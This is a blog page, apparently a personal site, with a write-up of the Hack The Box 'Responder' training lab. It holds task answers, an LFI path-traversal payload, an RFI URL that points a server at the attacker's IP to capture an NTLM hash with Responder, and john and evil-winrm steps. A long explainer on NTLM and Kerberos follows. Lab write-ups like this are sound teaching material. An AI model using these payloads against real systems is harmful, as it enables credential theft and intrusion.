@@ -1,0 +1,184 @@
+<!DOCTYPE html><html lang="en">
+	<!-- Power by astro.build, bulma.io and pages.cloudflare.com -->
+	<head>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css">
+		<link rel="stylesheet" href="/styles/global.css">
+		<link rel="stylesheet" href="/styles/code_theme.css">
+		<!-- <script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script> -->
+		<title>[Hack The Box] [Starting Point] [Tier 1] Responder | Versun</title>
+		<link rel="icon" type="image/x-icon" href="/avatar.jpg">
+	</head>
+	<body>
+			<nav class="tabs mb-4 has-background-warning">
+    
+    <ul>
+        <li><a class="has-text-black navbar-item" href="/">Home</a></li>
+    </ul>
+
+</nav><section>
+    <div class="container content" id="post">
+      <h2 class="subtitle">[Hack The Box] [Starting Point] [Tier 1] Responder</h2>
+      <p><strong>TASK 1</strong></p>
+<p><strong>When visiting the web service using the IP address, what is the domain that we are being redirected to?</strong> unika.htb</p>
+<p><strong>TASK 2</strong></p>
+<p><strong>Which scripting language is being used on the server to generate webpages?</strong> php</p>
+<p><strong>TASK 3</strong></p>
+<p><strong>What is the name of the URL parameter which is used to load different language versions of the webpage?</strong> page</p>
+<p><strong>TASK 4</strong></p>
+<p><strong>Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: “french.html”, “//10.10.14.6/somefile”, ”../../../../../../../../windows/system32/drivers/etc/hosts”, “minikatz.exe”?</strong> ../../../../../../../../windows/system32/drivers/etc/hosts</p>
+<p><strong>TASK 5</strong></p>
+<p><strong>Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: “french.html”, “//10.10.14.6/somefile”, ”../../../../../../../../windows/system32/drivers/etc/hosts”, “minikatz.exe”?</strong> //10.10.14.6/somefile</p>
+<p><strong>TASK 6</strong></p>
+<p><strong>What does NTLM stand for?</strong> New Technology Lan Manager</p>
+<p><strong>TASK 7</strong></p>
+<p><strong>Which flag do we use in the Responder utility to specify the network interface?</strong> -I</p>
+<p><strong>TASK 8</strong></p>
+<p><strong>There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?</strong> John The Ripper</p>
+<p><strong>TASK 9</strong></p>
+<p><strong>What is the password for the administrator user?</strong> badminton</p>
+<p><strong>TASK 10</strong></p>
+<p><strong>We’ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?</strong> 5985</p>
+<p><strong>SUBMIT FLAG</strong></p>
+<p>Steps:</p>
+<p>edit /etc/hosts:</p>
+<p><code>target-ip  unika.htb</code></p>
+<p>尝试LFI(Local File Inclusion)，爆出具体的路径</p>
+<p><img src="/images/a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3/88538f07-e81a-409c-a293-fe36ae44e07a.png" alt=""></p>
+<p>验证下路径是否正确，查看hosts文件</p>
+<p><img src="/images/a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3/7c4d5417-7768-45a0-93e6-ea421327738e.png" alt=""></p>
+<p>使用responder来监听: <code>sudo responder -I tun0</code></p>
+<p>然后访问 <a href="http://unika.htb/?page=//%5C%5BYour_tun0_IP%5C%5D/anything">http://unika.htb/?page=//\[Your_tun0_IP\]/anything</a></p>
+<p>就会获取到hash</p>
+<p><img src="/images/a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3/9ab430bd-0840-42a7-9a12-200212f5935d.png" alt=""></p>
+<p>把hash保存下来，<code>echo "Admin....." >hash.txt</code></p>
+<p>使用john来破解，<code>john --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt</code></p>
+<p><img src="/images/a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3/ac2f1a3d-1bce-4d95-9035-24990276422c.png" alt=""></p>
+<p>接下来开始用nmap扫描，注意该lab有速度检测，建议使用T4速度：</p>
+<p>虽然没有扫描出winRM端口，但通过Task 10，谷歌下可以知道说的是winRM，默认端口就是5985</p>
+<p><img src="/images/a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3/9fff90d4-11d7-44b4-993d-b5bc2cf4e614.png" alt=""></p>
+<p>之后使用evil-winrm工具，即可获取到powershell</p>
+<p><img src="/images/a13d8a98-2f3f-11ed-ab02-c2af19d2d6e3/0265865a-662f-47ec-a065-aad699bbaebd.png" alt=""></p>
+<p>之后去Users\mike\Desktop文件夹下面，得到flag</p>
+<hr>
+<h3 id="note"><strong>Note:</strong></h3>
+<p><a href="/attachments/Responder.pdf">Responder.pdf</a></p>
+<p>Ref:</p>
+<p><a href="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt">Auto_Wordlists/file_inclusion_windows.txt at main · carlospolop/Auto_Wordlists (github.com)</a></p>
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/winrm/portal">Windows 远程管理 - Win32 apps | Microsoft Docs</a></p>
+<p><a href="https://morgansimonsen.com/2009/12/10/winrm-and-tcp-ports/#:~:text=WinRM%2C%20or%20Windows%20Remote%20Management%2C%20is%20an%20HTTP,listens%20for%20local%20requests%20on%20TCP%20port%2047001.">Windows远程管理的安装和配置 - Win32 apps | Microsoft Docs</a></p>
+<p><a href="https://en.wikipedia.org/wiki/NT_LAN_Manager">NT LAN Manager - Wikipedia</a></p>
+<p><a href="https://docs.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview">NTLM Overview | Microsoft Docs</a></p>
+<p><a href="https://www.crowdstrike.com/cybersecurity-101/ntlm-windows-new-technology-lan-manager/">NTLM Explained: Definition, Protocols &#x26; More | CrowdStrike</a></p>
+<p>Tools: nmap, responder, john, evil-winrm</p>
+<p>Q: 什么是 Windows Remote Management (WinRM)</p>
+<p>WinRM，即Windows远程管理，是一个基于HTTP的Windows远程管理和shell协议。</p>
+<p>该协议是基于简单对象访问协议 (SOAP) 的、防火墙友好的标准协议，使来自不同供应商的硬件和操作系统能够互操作</p>
+<p>如果WinRM没有被配置为远程访问，但该服务被启动，它就会在TCP 47001端口监听本地请求。</p>
+<p>如果配置了监听器，它仍将监听47001，但也监听默认的TCP端口5985（HTTP）和5986（HTTPS）。</p>
+<p>Q: 什么是Windows New Technology LAN Manager (NTLM) <sup><a href="#user-content-fn-1" id="user-content-fnref-1" data-footnote-ref="" aria-describedby="footnote-label">1</a></sup></p>
+<p>是微软开发的一种用于用户认证的协议，它是一种single sign on (SSO)认证工具</p>
+<p>Windows 2000以后，默认被Kerberos协议代替。</p>
+<hr>
+<section data-footnotes="" class="footnotes"><h2 class="sr-only" id="footnote-label">Footnotes</h2>
+<ol>
+<li id="user-content-fn-1">
+<p>Windows New Technology LAN Manager (NTLM)</p>
+<h2 id="what-is-ntlm-used-for"><strong>What Is NTLM Used For?</strong></h2>
+<p><strong>Windows New Technology LAN Manager (NTLM)</strong> is a suite of security protocols offered by Microsoft to authenticate users’ identity and protect the integrity and confidentiality of their activity. At its core, NTLM is a <strong>single sign on (SSO)</strong> tool that relies on <strong>a challenge-response protocol</strong> to confirm the user without requiring them to submit a password.</p>
+<p>Despite known vulnerabilities, NTLM remains widely deployed even on new systems in order to maintain compatibility with legacy clients and servers. While NTLM is still supported by Microsoft, it has been replaced by Kerberos as the default authentication protocol in Windows 2000 and subsequent Active Directory (AD) domains.</p>
+<h2 id="how-does-the-ntlm-protocol-work"><strong>How Does the NTLM Protocol Work?</strong></h2>
+<p>NTLM authenticates users through <strong>a challenge-response mechanism</strong>. This process consists of three messages:</p>
+<p><strong>Negotiation message</strong> from the client</p>
+<p><strong>Challenge message</strong> from the server</p>
+<p><strong>Authentication message</strong> from the client</p>
+<h3 id="ntlm-authentication-process"><strong>NTLM Authentication Process</strong></h3>
+<p><strong>NTLM authentication</strong> typically follows the following step-by-step process:</p>
+<p>The user shares their username, password and domain name with the client.</p>
+<p>The client develops a scrambled version of the password — or hash — and deletes the full password.</p>
+<p>The client passes a plain text version of the username to the relevant server.</p>
+<p>The server replies to the client with a challenge, which is a 16-byte random number.</p>
+<p>In response, the client sends the challenge encrypted by the hash of the user’s password.</p>
+<p>The server then sends the challenge, response and username to the domain controller (DC).</p>
+<p>The DC retrieves the user’s password from the database and uses it to encrypt the challenge.</p>
+<p>The DC then compares the encrypted challenge and client response. If these two pieces match, then the user is authenticated and access is granted.</p>
+<h2 id="the-difference-between-ntlm-and-kerberos"><strong>The Difference Between NTLM and Kerberos?</strong></h2>
+<p>Like NTLM, <strong>Kerberos</strong> is an authentication protocol. It replaced NTLM as the default/standard authentication tool on Windows 2000 and later releases.</p>
+<p>The main difference between NTLM and Kerberos is in how the two protocols manage authentication. NTLM relies on a three-way handshake between the client and server to authenticate a user. Kerberos uses a two-part process that leverages a ticket granting service or key distribution center.</p>
+<p>Another main difference is whether passwords are hashed or encrypted. NTLM relies on <strong>password hashing</strong>, which is a one-way function that produces a string of text based on an input file; Kerberos leverages <strong>encryption</strong>, which is a two-way function that scrambles and unlocks information using an encryption key and decryption key respectively.</p>
+<p>Even though the Kerberos protocol is Microsoft’s default authentication method today, NTLM serves as a backup. If Kerberos fails to authenticate the user, the system will attempt to use NTLM instead.</p>
+<h3 id="why-was-ntlm-replaced-by-kerberos"><strong>Why Was NTLM Replaced by Kerberos?</strong></h3>
+<p>NTLM was subject to several known security vulnerabilities related to password hashing and salting.</p>
+<p>In NTLM, passwords stored on the server and domain controller are not “<strong>salted</strong>” — meaning that a random string of characters is not added to the hashed password to further protect it from cracking techniques. This means that adversaries who possess a password hash do not need the underlying password to authenticate a session. As a result, systems were vulnerable to <strong>brute force attacks</strong>, which is when an attacker attempts to crack a password through multiple log-in attempts. If the user selects a weak or common password, they are especially susceptible to such tactics.</p>
+<p>NTLM’s cryptography also fails to take advantage of new advances in algorithms and encryption that significantly enhance security capabilities.</p>
+<h3 id="kerberos-protocol"><strong>Kerberos Protocol</strong></h3>
+<p>Kerberos was developed by researchers at the Massachusetts Institute of Technology (MIT) in the 1980s. The name is derived from the Greek mythological character Kerberos, the three-headed dog who guards the underworld.</p>
+<p>In practice, the three security components in the Kerberos protocol are represented as:</p>
+<p>A client seeking authentication</p>
+<p>A server the client wants to access</p>
+<p>The ticketing service or key distribution center (KDC)</p>
+<h3 id="kerberos-authentication"><strong>Kerberos Authentication</strong></h3>
+<p>Here is the twelve-step process for Kerberos authentication:</p>
+<p>The user shares their username, password, and domain name with the client.</p>
+<p>The client assembles a package — or an authenticator — which contains all relevant information about the client, including the user name, date and time. All information contained in the authenticator, aside from the user name, is encrypted with the user’s password.</p>
+<p>The client sends the encrypted authenticator to the KDC.</p>
+<p>The KDC checks the user name to establish the identity of the client. The KDC then checks the AD database for the user’s password. It then attempts to decrypt the authenticator with the password. If the KDC is able to decrypt the authenticator, the identity of the client is verified.</p>
+<p>Once the identity of the client is verified, the KDC creates a ticket or session key, which is also encrypted and sent to the client.</p>
+<p>The ticket or session key is stored in the client’s Kerberos tray; the ticket can be used to access the server for a set time period, which is typically 8 hours.</p>
+<p>If the client needs to access another server, it sends the original ticket to the KDC along with a request to access the new resource.</p>
+<p>The KDC decrypts the ticket with its key. (The client does not need to authenticate the user because the KDC can use the ticket to verify that the user’s identity has been confirmed previously).</p>
+<p>The KDC generates an updated ticket or session key for the client to access the new shared resource. This ticket is also encrypted by the server’s key. The KDC then sends this ticket to the client.</p>
+<p>The client saves this new session key in its Kerberos tray, and sends a copy to the server.</p>
+<p>The server uses its own password to decrypt the ticket.</p>
+<p>If the server successfully decrypts the session key, then the ticket is legitimate. The server will then open the ticket and review the access control list (ACL) to determine if the client has the necessary permission to access the resource.</p>
+<h2 id="applications-that-use-ntlm"><strong>Applications That Use NTLM</strong></h2>
+<p>NTLM was replaced as the default authentication protocol in Windows 2000 by Kerberos. However, NTLM is still maintained in all Windows systems for compatibility purposes between older clients and servers.</p>
+<p>For example, computers still running Windows 95, Windows 98, or Windows NT 4.0 will use the NTLM protocol for network authentication with a Windows 2000 domain. Meanwhile, computers running Windows 2000 will use NTLM when authenticating servers with Windows NT 4.0 or earlier, as well as when accessing resources in Windows 2000 or earlier domains. NTLM is also used to authenticate local logons with non-domain controllers.</p>
+<h2 id="ntlm-benefits-and-challenges"><strong>NTLM Benefits and Challenges</strong></h2>
+<p>NTLM is considered an outdated protocol. As such, its benefits — when compared to a more modern solution, such as Kerberos — are limited. Yet the original promise of NTLM remains true: Clients use password hashing to avoid sending unprotected passwords over the network.</p>
+<p>At this point there are several clear disadvantages to relying on NTLM authentication:</p>
+<ul>
+<li>
+<p><strong>Single authentication.</strong> NTLM is a single authentication method. It relies on a challenge-response protocol to establish the user. It does not support <a href="https://www.crowdstrike.com/cybersecurity-101/multifactor-authentication-mfa/">multifactor authentication</a> (MFA), which is the process of using two or more pieces of information to confirm the identity of the user.</p>
+</li>
+<li>
+<p><strong>Security vulnerabilities.</strong> The relatively simplistic form of password hashing makes NTLM systems vulnerable to several modes of attacks, including <a href="https://www.crowdstrike.com/cybersecurity-101/pass-the-hash/">pass-the-hash</a> and <a href="https://www.crowdstrike.com/cybersecurity-101/brute-force-attacks/">brute-force attacks</a>.</p>
+</li>
+<li>
+<p><strong>Outdated cryptography.</strong> NTLM does not leverage the latest advances in algorithmic thinking or encryption to make passwords more secure.</p>
+</li>
+</ul>
+<h3 id="how-can-you-protect-your-network-using-ntlm"><strong>How Can You Protect Your Network Using NTLM?</strong></h3>
+<p>Given the known security risks associated with NTLM, CrowdStrike recommends that organizations try to reduce NTLM usage in their network as much as possible.</p>
+<p>For organizations still relying on NTLM for compatibility reasons, CrowdStrike offers the following recommendations to enhance security and minimize risk.</p>
+<p><strong>Enforce NTLM mitigations.</strong> To be fully protected from NTLM relay attacks, you will need to enable server signing and EPA on all relevant servers.</p>
+<p><strong>Patch!</strong> Make sure your systems are fully protected with the latest security updates from Microsoft.</p>
+<p><strong>Use advanced techniques.</strong> Apply advanced NTLM relay detection and prevention techniques similar to the ones disclosed by Preempt (now CrowdStrike) in our Black Hat 2019 talk.</p>
+<p><strong>Identify weak variations.</strong> Some NTLM clients use weak NTLM variations (e.g., don’t send a MIC). This puts your network at a greater risk of being vulnerable to NTLM relay.</p>
+<p><strong>Monitor NTLM traffic in your network.</strong> Try to restrict insecure NTLM traffic.</p>
+<p>Get rid of clients sending LM responses and set the Group Policy Object (GPO) network security: LAN Manager authentication level to refuse LM responses. <a href="#user-content-fnref-1" data-footnote-backref="" class="data-footnote-backref" aria-label="Back to content">↩</a></p>
+</li>
+</ol>
+</section>
+    </div>
+  </section><hr>
+<script src="https://giscus.app/client.js" data-repo="versun/Tiny-Website-by-Astro" data-repo-id="R_kgDOH8gn5w" data-category="Announcements" data-category-id="DIC_kwDOH8gn584CRQOD" data-mapping="title" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="light_high_contrast" data-lang="en" crossorigin="anonymous" async>
+</script><footer class="container has-text-centered mt-6">
+  <span>
+    -<strong> 2022 · <a href="https://versun.me">Versun</a> · <a href="https://versun.me/rss.xml">rss</a></strong> -
+    <br>
+    Source code licensed <a href="https://mit-license.org/" target="_blank">MIT.</a>
+    <br>
+    Website content licensed <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a>
+    <br>
+  </span>
+  <div style="color: transparent">
+    This is a honeypot:
+    <a href="mailto:2j9BV8WX3@versun.me" style="color: transparent">
+      2j9BV8WX3@versun.me
+    </a>
+    Please do not use it unless you are a spambot.
+  </div>
+</footer>
+	</body></html>
